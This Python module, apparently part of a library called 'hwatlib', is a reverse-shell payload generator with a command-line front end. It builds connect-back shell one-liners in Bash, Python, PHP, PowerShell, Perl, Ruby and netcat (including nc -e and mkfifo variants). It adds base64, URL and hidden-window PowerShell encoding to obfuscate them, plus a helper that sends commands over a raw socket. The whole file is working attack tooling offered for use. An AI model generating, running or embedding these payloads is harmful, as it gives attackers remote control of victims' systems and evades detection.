import argparse
import base64
import socket
import urllib.parse
import zlib
from dataclasses import dataclass
from typing import List, Optional, Union


class ReverseShellGenerator:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    # -----------------------
    # Core Payloads
    # -----------------------
    def bash(self):
        return f"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"

    def python3(self):
        return (
            f"python3 -c 'import os,pty,socket;"
            f"s=socket.socket();s.connect((\"{self.ip}\",{self.port}));"
            f"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
        )

    def php(self):
        return [
            f"<?php $sock=fsockopen(\"{self.ip}\",{self.port});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
            f"php -r '$sock=fsockopen(\"{self.ip}\",{self.port});exec(\"sh <&3 >&3 2>&3\");'",
        ]

    def powershell(self):
        return (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"$client=New-Object System.Net.Sockets.TCPClient('{self.ip}',{self.port});"
            f"$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};"
            f"while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;"
            f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback=(iex $data 2>&1 | Out-String );"
            f"$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";"
            f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}'"
        )

    def perl(self):
        return (
            f"perl -e 'use Socket;$i=\"{self.ip}\";$p={self.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        )

    def ruby(self):
        return (
            f"ruby -rsocket -e'f=TCPSocket.open(\"{self.ip}\",{self.port}).to_i;"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        )

    def nc(self):
        return f"nc -e /bin/sh {self.ip} {self.port}"

    def nctraditional(self):
        return f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.ip} {self.port} > /tmp/f"

    # -----------------------
    # Obfuscation Features
    # -----------------------
    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def url_encode(payload: str) -> str:
        return urllib.parse.quote(payload)

    @staticmethod
    def powershell_compressed(payload: str) -> str:
        compressed = base64.b64encode(zlib.compress(payload.encode("utf-16le"))).decode()
        return f"powershell -nop -w hidden -enc {compressed}"

    # -----------------------
    # Bundle
    # -----------------------
    def all_payloads(self):
        return {
            "Bash": self.bash(),
            "Python3": self.python3(),
            "PHP": self.php(),
            "PowerShell": self.powershell(),
            "Perl": self.perl(),
            "Ruby": self.ruby(),
            "Netcat": self.nc(),
            "Netcat (mkfifo)": self.nctraditional(),
        }


def php_reverse_shell(ip: str, port: int) -> str:
    """README helper: exploit.php_reverse_shell(ip, port)."""

    gen = ReverseShellGenerator(ip, port)
    return gen.php()[0]


@dataclass
class RemoteConnection:
    sock: socket.socket
    encoding: str = "utf-8"

    def send(self, data: Union[str, bytes]) -> None:
        if isinstance(data, str):
            data = data.encode(self.encoding, errors="ignore")
        self.sock.sendall(data)

    def recv(self, size: int = 4096) -> str:
        return self.sock.recv(size).decode(self.encoding, errors="ignore")

    def run_shell(self, shell_cmd: str, *, newline: str = "\n") -> str:
        """Send a command string to a remote TCP service and return any immediate output."""

        self.send(shell_cmd + newline)
        self.sock.settimeout(1.0)
        try:
            return self.recv(65535)
        except Exception:
            return ""

    def close(self) -> None:
        try:
            self.sock.close()
        except Exception:
            pass

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        self.close()


def connect_remote(host: str, port: int, *, timeout: float = 5.0) -> RemoteConnection:
    """README helper: exploit.connect_remote(host, port)."""

    s = socket.create_connection((host, port), timeout=timeout)
    return RemoteConnection(sock=s)


def main(argv: Optional[List[str]] = None) -> int:
    parser = argparse.ArgumentParser(prog="hwat-exploit", description="hwatlib exploit helpers (payload generation)")
    parser.add_argument("ip", help="Callback IP")
    parser.add_argument("port", type=int, help="Callback port")
    parser.add_argument("--type", default="php", choices=["bash", "python3", "php", "powershell", "perl", "ruby", "nc"], help="Payload type")
    args = parser.parse_args(argv)

    gen = ReverseShellGenerator(args.ip, args.port)
    payload = gen.all_payloads().get(args.type.capitalize()) if args.type != "nc" else gen.nc()

    # Match the chosen payload name mapping.
    if args.type == "bash":
        payload = gen.bash()
    elif args.type == "python3":
        payload = gen.python3()
    elif args.type == "php":
        payload = gen.php()[0]
    elif args.type == "powershell":
        payload = gen.powershell()
    elif args.type == "perl":
        payload = gen.perl()
    elif args.type == "ruby":
        payload = gen.ruby()
    elif args.type == "nc":
        payload = gen.nc()

    print(payload)
    return 0
